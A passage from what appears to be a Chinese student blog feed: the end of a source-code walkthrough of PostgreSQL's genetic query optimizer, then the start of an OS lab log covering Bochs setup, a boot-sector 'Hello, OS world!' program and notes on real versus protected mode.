算子由函数ox2实现，其处理流程如下:</p><ol><li>根据基因的数目 gene ，随机选择一个 [gene/3 , 2/3 * gene] 之间的整数 ，从父体1中随机选择p个基因，设为集合A</li><li>对于父体2中不在A中基因，拷贝到后代对应的位置中。</li><li>对在A中的基因，按它们在父体 中的顺序依次拷贝到后代剩余的位中。</li></ol><h3 id="%EF%BC%885%EF%BC%89%E5%8F%98%E5%BC%82%E7%AE%97%E5%AD%90" tabindex="-1">（5）变异算子</h3><p>变异算子由函数geqo_mutation实现，该函数随机地从父体中产生两个变异位，交换这两个变异位的数值，执行num_gene(基因数目)次这样的操作。</p><h3 id="%EF%BC%886%EF%BC%89%E7%BB%88%E6%AD%A2%E6%9D%A1%E4%BB%B6" tabindex="-1">（6）终止条件</h3><p>遗传算法采用设定演化代数的方法，但演化到一定数量的代数时，就停止演化。默认的演化代数是种群的大小(pool_size ，缓冲池的大小)。演化代数的计算涉及下面两个参数:</p><ol><li>geqo_effort :整型变量，是用于限制种群大小的影响因子。取值范围是 [1 10 ]，默认值为5</li><li>geqo_pool_size :整型变量 ，表示缓冲池(用于存储种群中的个体)大小.缓冲池的大小和种群大小相同， 其值至少为2</li></ol><p>种群大小(缓冲池的大小) pool_size 由函数伊gimme_pool_size 确定，其参数 nr_rel 为查询中表的数量。计算方法如下:</p><ol><li>计算上限值 maxsize和下限值minsize<br><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mn>50</mn><mo>∗</mo><mi>g</mi><mi>e</mi><mi>q</mi><msub><mi>o</mi><mi>e</mi></msub><mi>f</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>t</mi><mspace linebreak="newline"></mspace><mi>m</mi><mi>i</mi><mi>n</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mn>10</mn><mo>∗</mo><mi>g</mi><mi>e</mi><mi>q</mi><msub><mi>o</mi><mi>e</mi></msub><mi>f</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>t</mi></mrow><annotation encoding="application/x-tex"> maxsize=50*geqo_effort\\minsize=10*geqo_effort </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">50</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10764em;">ff</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">t</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">min</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10764em;">ff</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">t</span></span></span></span></span></eqn></section></li><li>计算基准大小<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mi>p</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mn>2.0</mn><mo separator="true">,</mo><mi>n</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>l</mi><mo>+</mo><mn>1.0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">size=pow(2.0,nr_rel+1.0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord">2.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1.0</span><span class="mclose">)</span></span></span></span></eq></li><li>如果基准大小位于上限值和下限值之间，则取基准大小作为种群大小;如果低于下限值，则取下限值;如果高于上限值，则取上限值</li></ol><h3 id="%EF%BC%887%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%8E%92%E5%88%97%E7%94%9F%E6%88%90%E8%B7%AF%E5%BE%84" tabindex="-1">（7）基于排列生成路径</h3><p>在遗传算法中由排列生成连接路径由以下算法实现</p><p><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/GA_creat_path.jpg" alt="GA_creat_path"></p><p>其中变量rels中保存了按照排列数所对应的各个基本关系（即基本表）。<br>变量rels_temp用来保存当前不可连接的关系。（不可连接指只能用笛卡尔积进行连接）</p><p>该算法的处理过程：</p><p>依次取rels中的所有基本表，在rels_temp中依次寻找可以与其连接的表，如果存在可连接的表，则把这两个表进行连接生成新的表，并从头开始继续在rels_temp中寻找可连接的表，并将其与新生成的表连接，一直到找不到可连接的表位置，最后将最终生成的新表插入rels_temp结尾；继续在rels中取下一个表，重复上述过程。</p><h2 id="7-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90" tabindex="-1">7 源码分析</h2><h3 id="%E6%BA%90%E7%A0%81%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90" tabindex="-1">源码目录分析</h3><p>access文件夹包含各种存储访问方法、索引的实现。(重要)<br>bootstrap文件夹为数据库初始化时调用方法。<br>catalog文件夹为系统目录。<br>commands文件夹为SQL命令。(重要)<br>executor文件夹为执行器相关代码。(重要)<br>foreign文件夹为FDW相关代码，使得用户可以通过SQL访问没有存储在数据库中的数据。(扩展)<br>jit文件夹为Just-In-Time Compilation，为即时编译的相关代码，用于提高查询语句性能。（扩展）<br>lib文件夹为通用函数。<br>libpq文件夹为c/cpp的库函数，处理与客户端的通信。<br>main文件夹为主程序。<br>nodes文件夹为链表、节点等数据结构，以及相关的方法。(重要)<br>optimizer文件夹为优化器相关代码。(重要)<br>parser文件夹为编译器相关代码。(重要)<br>partitioning文件夹为分片相关代码。(重要)<br>po文件夹为语言文件配置。<br>port文件夹为平台兼容性处理相关代码。<br>postmaster文件夹为postmaster进程，以及相关辅助进程的代码。<br>regex文件夹为正则处理相关代码。(重要)<br>replication文件夹为有关流复制的相关代码。(重要)<br>rewrite文件夹为规则与视图相关的重写处理。<br>snowball文件夹为全文检索相关（语干处理）代码。<br>statisics文件夹为收集统计信息相关代码，与估算相关。<br>storage文件夹为管理各种类型存储系统相关代码。(重要)<br>tcop文件夹为postgres服务进程的主要处理部分，即查询流程调用的相关代码。(重要)<br>tsearch文件夹为全文检索。(扩展)<br>utils文件夹为各种支持函数，如错误报告、各种初始化操作、内存管理等。</p><p>我的分析任务：PG中遗传算法的使用分析</p><p>在文件src/backend/optimizer/geqo中为<code>遗传优化计划器</code></p><h3 id="src%2Fbackend%2Foptimizer%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90" tabindex="-1">src/backend/optimizer目录分析</h3><p>该目录下的文件使用解析器返回的查询结构，生成执行器使用的计划。</p><p>/plan目录生成实际的输出计划<br>/path目录生成所有可能的连接表的方法<br>/geqo目录下位单独的“遗传优化”计划器<br>/prep目录处理特殊情况下的预处理步骤<br>/util目录下为公用的模块</p><h3 id="geqo%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90" tabindex="-1">geqo下的代码具体分析</h3><h4 id="(1)-geqo_main.c" tabindex="-1">(1) geqo_main.c</h4><p>其中共有三个函数</p><ul><li><p><code>RelOptInfo * geqo(PlannerInfo *root, int number_of_rels, List *initial_rels)</code><br>该函数为遗传算法优化的主函数，通过调用该函数来用遗传算法生成查询计划。<br>该函数有三个参数</p><ul><li><code>root</code>：PlannerInfo 结构体包含有关正在优化的查询的各种信息，包括涉及的表、连接条件以及可能相关的任何约束或索引。遗传算法使用此信息生成潜在查询计划并评估其适合度。</li><li><code>number_of_rels</code>：这个整数表示正在优化的关系数，即查询中涉及的表数。</li><li><code>initial_rels</code>：这是一个 RelOptInfos 的 List，表示正在优化的初始关系。</li></ul></li></ul><p>函数返回一个指向 RelOptInfo 结构体的指针，该结构体表示遗传算法找到的最佳查询计划。</p><p>随后该函数依次完成：</p><p>初始化数据；获得随机数种子；设置GA相关参数；为缓冲池分配空间；随机初始化缓冲池；并按适应值对缓冲池中的个体进行排序；为重组杂交进行空间分配；进行遗传算的迭代，依次进行选择重组变异；选择最优个体；释放空间；返回最优个体。</p><p>该函数为遗传算法的主要部分，main函数。</p><ul><li><code>static int gimme_pool_size(int nr_rel)</code><br>该函数用于确定缓冲池大小（种群大小）</li><li><code>static int gimme_number_generations(int pool_size)</code><br>从该函数得到迭代次数</li></ul><h4 id="(2)-geqo_misc.c" tabindex="-1">(2) geqo_misc.c</h4><p>该文件下函数主要进行调试使用，对算法中间的结果进行输出</p><ol><li><code>static double avg_pool(Pool *pool)</code><br>返回平均代价值</li><li><code>void print_pool(FILE *fp, Pool *pool, int start, int stop)</code><br>输出当前种群中所有个体的染色体和代价</li><li><code>void print_gen(FILE *fp, Pool *pool, int generation)</code><br>输出某一代基因的最好，最坏，中位数和平均代价值</li><li><code>void print_edge_table(FILE *fp, Edge *edge_table, int num_gene)</code><br>输出边重组杂交的边表</li></ol><h4 id="(3)-geqo_mutation.c" tabindex="-1">(3) geqo_mutation.c</h4><p>只有一个函数，对种群中的个体实施变异操作<br><code>void geqo_mutation(PlannerInfo *root, Gene *tour, int num_gene)</code></p><h4 id="(4)-geqo_pool.c" tabindex="-1">(4) geqo_pool.c</h4><p>该文件中包含与缓冲区的相关函数</p><ol><li><code>Pool * alloc_pool(PlannerInfo *root, int pool_size, int string_length)</code><br>为遗传算法缓冲器分配空间</li><li><code>void free_pool(PlannerInfo *root, Pool *pool)</code><br>释放1函数中分配的空间</li><li><code>voidrandom_init_pool(PlannerInfo *root, Pool *pool)</code><br>随机初始化缓冲池</li><li><code>void sort_pool(PlannerInfo *root, Pool *pool)</code><br>从小到大按适应度排序缓冲池中的个体</li><li><code>static int compare(const void *arg1, const void *arg2)</code><br>排序的方法，源码中使用快速排序算法</li><li><code>Chromosome * alloc_chromo(PlannerInfo *root, int string_length)</code><br>为个体分配空间</li><li><code>void free_chromo(PlannerInfo *root, Chromosome *chromo)</code><br>释放为个体分配的空间</li><li><code>void spread_chromo(PlannerInfo *root, Chromosome *chromo, Pool *pool)</code><br>插入一个新的个体到缓冲池中，代替缓冲池中的最差的个体</li></ol><h4 id="(5)-geqo_random.c" tabindex="-1">(5) geqo_random.c</h4><p>该文件用来产生随机数，含有三个函数</p><ol><li><code>void geqo_set_seed(PlannerInfo *root, double seed)</code><br>设置GEQO随机数生成器的种子，以确保每次运行GEQO时使用相同的随机数序列</li><li><code>double geqo_rand(PlannerInfo *root)</code><br>函数使用了简单的线性同余算法来生成伪随机数。该函数返回一个范围在 0 到 1 之间的双精度浮点数</li><li><code>int geqo_randint(PlannerInfo *root, int upper, int lower)</code><br>函数的作用是生成一个介于 upper 和 lower 之间的随机整数。</li></ol><h4 id="(6)-geqo_selection.c" tabindex="-1">(6) geqo_selection.c</h4><p>该文件内进行父体选择</p><ol><li><code>static int linear_rand(PlannerInfo *root, int pool_size, double bias)</code><br>该函数实现线性随机选择算法,使用了类似于概率密度函数的方法，其中偏差参数用于增加某些候选项被选择的概率,用于选择父代来产生后代。</li><li><code>void geqo_selection(PlannerInfo *root, Chromosome *momma, Chromosome *daddy,Pool *pool, double bias)</code><br>该函数使用随机选择过程来选择两个父染色体进行交叉。</li></ol><h4 id="(7)-geqo_copy.c" tabindex="-1">(7) geqo_copy.c</h4><p>该文件内只有一个函数<code>void geqo_copy(PlannerInfo *root, Chromosome *chromo1, Chromosome *chromo2,int string_length)</code>,用来复制个体</p><h4 id="(8)-%E5%87%A0%E4%B8%AA%E6%9D%82%E4%BA%A4%E7%AE%97%E5%AD%90%E6%96%87%E4%BB%B6" tabindex="-1">(8) 几个杂交算子文件</h4><ul><li>geqo_cx.c 循环杂交<br>包含函数<code>int cx(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring,int num_gene, City * city_table)</code></li><li>geqo_erx.c 边重组杂交,包含以下函数<ul><li><code>Edge * alloc_edge_table(PlannerInfo *root, int num_gene)</code>为边表分配空间</li><li><code>void free_edge_table(PlannerInfo *root, Edge *edge_table)</code>释放边表空间</li><li><code>float gimme_edge_table(PlannerInfo *root, Gene *tour1, Gene *tour2, int num_gene, Edge *edge_table)</code>填充记录两个个体间的边的数据结构</li><li><code>static int gimme_edge(PlannerInfo *root, Gene gene1, Gene gene2, Edge *edge_table)</code>从给定基因中构建一条边并将其加入边表</li><li><code>int gimme_tour(PlannerInfo *root, Edge *edge_table, Gene *new_gene, int num_gene)</code>通过边表和基因返回一条可行的路径长度</li><li><code>static void remove_gene(PlannerInfo *root, Gene gene, Edge edge, Edge *edge_table)</code>从边表中移除该基因</li><li><code>static Gene gimme_gene(PlannerInfo *root, Edge edge, Edge *edge_table)</code>从给定的边表中返回一个基因</li><li><code>static Gene edge_failure(PlannerInfo *root, Gene *gene, int index, Edge *edge_table, int num_gene)</code>当遇到失败的边缘时，对基因进行修复</li></ul></li><li>geqo_pmx.c 部分匹配杂交<br>包含函数<code>void pmx(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene)</code></li><li>geqo_ox1.c 顺序杂交1<br><code>void ox1(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene,City * city_table)</code></li><li>geqo_ox1.c 顺序杂交2<br><code>voidox2(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene, City * city_table)</code></li><li>geqo_px.c 基于位置的杂交<br><code>void px(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene,City * city_table)</code></li></ul><h4 id="(9)-geqo_eval.c" tabindex="-1">(9) geqo_eval.c</h4><p>该文件对查询树进行估价</p><ul><li><code>Cost geqo_eval(PlannerInfo *root, Gene *tour, int num_gene)</code><br>返回一个个体的查询树的代价</li><li><code>RelOptInfo * gimme_tree(PlannerInfo *root, Gene *tour, int num_gene)</code>接收一个查询优化器（PlannerInfo）的指针和一组遗传算法的基因（Gene），然后返回一个查询优化树（RelOptInfo）。</li><li><code>static List * merge_clump(PlannerInfo *root, List *clumps, Clump *new_clump, int num_gene,bool force)</code>作用是合并一个新的数据块（new_clump）到一个包含多个数据块的列表中（clumps），并返回合并后的列表。参数 num_gene 表示数据块中基因的数量，而参数 force 用于控制是否强制进行合并。</li><li><code>static bool desirable_join(PlannerInfo *root,RelOptInfo *outer_rel, RelOptInfo *inner_rel)</code>用于确定是否应该对两个关系进行连接，这两个关系分别由 outer_rel 和 inner_rel 表示，其确定连接是否可行是基于多个因素，如连接的预估成本和选择性等</li></ul><h4 id="(10)-geqo_recombination.c" tabindex="-1">(10) geqo_recombination.c</h4><p>该文件为杂交重组程序，包含以下函数</p><ul><li><code>void init_tour(PlannerInfo *root, Gene *tour, int num_gene)</code>随机生成一条合法的“旅行推销员”路径（即每个点仅访问一次）</li><li><code>City * alloc_city_table(PlannerInfo *root, int num_gene)</code>为城市表分配内存</li><li><code>void free_city_table(PlannerInfo *root, City * city_table)</code>为城市表回收内存</li></ul><h2 id="8-%E6%80%BB%E7%BB%93" tabindex="-1">8 总结</h2><p>本次数据库实验我主要对PostgreSQL源码中的遗传算法部分进行了分析，分析了源码中该部分的具体函数，并了解了遗传算法在PG中的工作流程，如果之后有空，希望能研习全部的PG源码。</p><p>源码中遗传算法用于寻找最优的生成路径，这一点与TSP问题相似。</p><p>当点数过多时，使用动态规划难以求出最优解，这时就可以使用遗传算法较快地求出较优解来生成路径，提升了查询编译地速度。</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统试验--在linux环境下复现操作系统</title>
      <link href="/2023/08/16/%E6%9C%AC%E7%A7%91/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%95%E9%AA%8C/"/>
      <url>/2023/08/16/%E6%9C%AC%E7%A7%91/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%95%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><img src="/images/meitu/4.jpg">本次操作系统实验根据`Orange's 一个操作系统的实现`一书进行操作。在此记录试验的过程及心得<h2 id="%E7%AC%AC%E4%B8%80%E7%AB%A0%26%E7%AC%AC%E4%BA%8C%E7%AB%A0-hello%EF%BC%8Cos-world" tabindex="-1">第一章&amp;第二章 Hello，OS world</h2><p>这两章通过在windows使用虚拟机运行Ubuntu操作系统，在Ubuntu上使用bochs虚拟机来完成操作系统。</p><h3 id="1-%E4%BD%BF%E7%94%A8vm%E8%BF%90%E8%A1%8Cubuntu" tabindex="-1">1 使用vm运行Ubuntu</h3><p>我这里虚拟机运行的是Ubuntu20.04，但因为这本书是老书了，64位机运行结果会有问题，因此还是用了Ubuntu16.04的32位虚拟机,安装虚拟机时主要遇到的问题有：</p><ol><li>虚拟机连不上网，但在瞎搞之后能连上了，选择的时NAT连接</li><li>VM Tools 自动安装不上，会报错。VMtools可以实现Windows环境和Linux环境直接的文件交换，还是有必要安装的。解决方法是手动下载VM Tools，尽管之后还会报错，但已经能实现文件互通。</li></ol><h3 id="2-%E5%9C%A8ubuntu%E4%B8%AD%E4%BD%BF%E7%94%A8bochs" tabindex="-1">2 在Ubuntu中使用bochs</h3><p>我这里是在<a href="https://bochs.sourceforge.io/">官网</a>下载的安装包，版本是<a href="https://sourceforge.net/projects/bochs/files/bochs/2.7/bochs-2.7.tar.gz/download">2.7</a><br>之后参考书上和网上的一些博客进行安装，主要参考<a href="https://blog.csdn.net/weixin_49635198/article/details/126831887">博客</a><br>这里建议新建一个文件夹解压压缩包<br>使用命令<code>tar vxzf bochs-2.7.tar.gz</code>解压<br>之后使用命令<code>cd bochs-2.7</code>进入该文件夹<br>之后进行配置<br>输入命令<code>./configure --prefix=$home/你解压的地址 --enable-debugger --enable-disasm --enable-iodebug --enable-x86-debugger --with-x --with-x11</code><br>配置时可能遇到问题</p><ol><li>fatal error: X11/Xlib.h: No such file or directory<br>这里表示x11没有安装完整，输入：<code>sudo apt-get install libghc-x11-dev</code>即可</li><li>Ubuntu 编译提示 configure: error: no acceptable C compiler found in $PATH<br>这是没有安装 C 编译器,通过命令<code>sudo apt-get install -y build-essential</code>下载一些必要环境即可</li></ol><p>随后依次使用命令<code>make</code>和<code>sudo make install</code></p><p>这两个命令执行过程中我没有遇到什么问题，如果有遇到的话还请自己搜搜。</p><p>之后返回上一级目录，可以发现多了两个文件bin和share文件夹。</p><p>之后进入bin文件夹里面可以看到bximage和bochs两个文件，前者用来创建虚拟磁盘，或者用来配置虚拟机。</p><p>接下来让我们配置bochs文件，进入bin文件，输入命令<code>sudo gedit bochsrc</code>创建bochsrc配置文件，向该文件中输入以下代码进行虚拟机配置（直接复制粘贴即可）</p><pre><code class="language-asm">################################################################ Configuration file for Bochs################################################################ how much memory the emulated machine will havemegs: 32# filename of ROM imagesromimage: file=/home/mr-cold/boch/share/bochs/BIOS-bochs-latestvgaromimage: file=/home/mr-cold/boch/share/bochs/VGABIOS-lgpl-latest# what disk images will be used floppya: 1_44=a.img, status=inserted# choose the boot disk.boot: floppy# where do we send log messages?log: bochsout.txt# disable the mousemouse: enabled=0# enable key mapping, using US layout as default.#keyboard_mapping: enabled=1, map=/home/mr-cold/boch/share/bochs/keymaps/x11-pc-us.map</code></pre><p>之后在bin文件夹下输入<code>bochs -f bochsrc</code>即可运行虚拟机，选择6开始模拟，之后输入c即可显示交互命令行界面<br><img src="/images/本科/OS实验/bochs_1.jpg"><br><img src="/images/本科/OS实验/bochs_2.jpg"><br><img src="/images/本科/OS实验/bochs_3.jpg"><br>在上图中，报错是因为我们还没有驱动磁盘，在bochsrc的配置代码中我们可以看到该虚拟机配备软盘floppy为a.img，那么接下来我们就要创建一个软盘去实现一个最小的操作系统</p><h3 id="3-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" tabindex="-1">3 最简单的操作系统</h3><p>我们首先创建一个虚拟软盘(硬盘应该也可以，书中为软盘，毕竟是09年老书)。命令<code>bximage</code><br>随后依据提示创建一个1.44MB的软盘，同时将bochsrc中<code>floppya: 1_44=a.img, status=inserted</code>中的软盘改为你创建磁盘的名字，这将是虚拟机的磁盘。</p><p>随后实现书中的boot.asm(可以直接从书附带磁盘复制出来，磁盘从学校云图书馆即可下载)：通过<code>basm boot.asm -o boot.bin</code>将asm文件转为bin文件(asm文件即汇编文件，bin文件即二进制文件)</p><pre><code class="language-asm"> org 07c00h   ; 告诉编译器程序加载到7c00处 mov ax, cs mov ds, ax mov es, ax call DispStr   ; 调用显示字符串例程 jmp $   ; 无限循环DispStr: mov ax, BootMessage mov bp, ax   ; ES:BP = 串地址 mov cx, 16   ; CX = 串长度 mov ax, 01301h  ; AH = 13,  AL = 01h mov bx, 000ch  ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮) mov dl, 0 int 10h   ; 10h 号中断 retBootMessage:  db &quot;Hello, OS world!&quot;times  510-($-$$) db 0 ; 填充剩下的空间，使生成的二进制代码恰好为512字节dw  0xaa55    ; 结束标志</code></pre><p>这里的boot文件即是引导扇区，其作用是将loader模块调入内存，且大小固定为512B，默认在磁盘的第一个扇区。</p><p>将生成的bin文件放入bochs虚拟机的文件夹。使用命令<code>dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc</code>将bin文件写入软盘的第一个扇区，这里<code>conv=notrunc</code>不能删去，否则软盘会被截断(变为bin文件的大小)</p><ul><li><code>dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc</code>这句话是一个命令行指令，作用是将文件boot.bin复制到a.img中的第一个扇区（512字节），覆盖原有内容而不追加。其中：<ul><li>dd：一个Linux/Unix系统下的复制工具。</li><li>if：输入文件的路径。</li><li>of：输出文件的路径。</li><li>bs：每次复制的块大小，这里是512字节。</li><li>count：复制的块数，这里是1个块（即512字节）。<br>-conv：转换选项，这里是不做任何转换（notrunc）。</li></ul></li></ul><p>随后即可运行bochs虚拟机，使用指令<code>bochs -f bochsrc</code>。</p><p>结果：视窗第一行显示<code>Hello, OS world!</code><br><img src="/images/本科//OS实验/bochs_4.jpg"></p><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">第三章 保护模式</h2><h3 id="3.1-%E8%AE%A4%E8%AF%86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">3.1 认识保护模式</h3><h4 id="%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83" tabindex="-1">保护模式的运行环境</h4><ol><li>从<a href="bochs.sourceforge.net/guestos/freedos-img.tar.gz">网站</a>得到FreeDOS压缩包</li><li>解压后将文件夹中的a.img重命名为freedos.img仿佛bochs虚拟机的工作目录中</li><li>使用bximage创建虚拟磁盘pm.img</li><li>修改当前bochsrc的配置文件，增加如下几行<br>floppya: 1_44=“freedos.img”, status=inserted<br>floppyb: 1_44=“pm.img”, status=inserted<br>boot: a （这里即选择bochs虚拟机的驱动磁盘）</li><li>启动bochs虚拟机，随后再终端输入 <code>format b:</code>格式化B盘</li><li>从附书磁盘中获取pmtest1.asm，挂载到软驱pm.img中<br>注意将pmtest1.asm代码第8行中07c00h改为0100h，否则最后结果无法显示<br><code>nasm pmtest1.asm -o pmtest.com</code><br><code>sudo mount -o loop pm.img /mnt/floppy/</code><br><code>sudo cp pmtest1.com /mnt/floppy/</code><br><code>sudo umount /mnt/floppy/</code></li><li>启动bochs虚拟机，即启动freedos，输入<code>dir b:</code>可查看软盘B中的内容</li><li>输入<code>b:pmtest1.com</code>即可运行该文件，可以看到以下效果<br><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/3_1_1.jpg" alt="3_1_1"></li></ol><h4 id="%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">实模式和保护模式</h4><ul><li><p>CPU的实模式和保护模式是两种不同的工作状态，这两种工作状态主要用于控制CPU的访问内存和外设的方式。</p></li><li><p>实模式是CPU最初的工作状态，也是最基本的工作状态。在实模式下，CPU可以<code>直接访问内存和外设</code>，但只能使用16位的地址总线和处理器寄存器，因此内存地址的范围只能是从0到1MB。此外，在实模式下，CPU不提供对内存的保护，程序可以随意访问内存，这可能会导致内存损坏或数据丢失。</p></li><li><p>保护模式是CPU的一种高级工作状态，它提供了更高的性能和更强的内存保护。在保护模式下，CPU可以使用32位的地址总线和处理器寄存器，从而可以访问4GB的内存空间。此外，保护模式可以提供多任务处理、虚拟内存、安全性等高级功能。</p></li><li><p>在保护模式下，CPU将内存划分为许多不同的段，每个段都有自己的段描述符，用于描述该段的访问权限、基地址和长度等信息。这些段描述符是存储在内存中的数据结构，由操作系统来管理和维护。CPU访问内存时，必须遵循这些段描述符的规则，如果访问了不允许的内存区域，CPU会触发异常并终止程序的执行，从而实现了内存的保护。</p></li><li><p>为什么会有实模式？</p><ul><li>实模式最初是设计用于早期的计算机系统，在这种模式下CPU可以直接访问物理内存和外设，这种简单的访问方式可以更容易地与早期的操作系统和应用程序相兼容。但是，实模式存在许多限制，如只能使用16位的地址总线和处理器寄存器，内存保护不足等问题，这些限制已经不能满足现代计算机系统的需求。</li><li>为了满足计算机系统日益增长的复杂性和安全性需求，保护模式应运而生。保护模式提供了更多的功能和特性，如内存保护、多任务处理、虚拟内存等，这些特性使得操作系统和应用程序可以更好地控制和保护计算机系统的资源和数据，同时也提高了系统的性能和安全性。</li></ul></li><li><p>为什么现在还要有实模式到保护模式的转换，实模式不是早期计算机的吗？</p><ul><li>实模式虽然是最早的CPU工作模式之一，但是在一些情况下仍然需要将CPU从实模式切换到保护模式。主要原因有以下几个：<ul><li><ol><li>兼容性：一些操作系统或应用程序仍然需要在实模式下运行。例如，一些老旧的DOS程序和BIOS固件仅支持实模式，无法在保护模式下正常运行（这个应该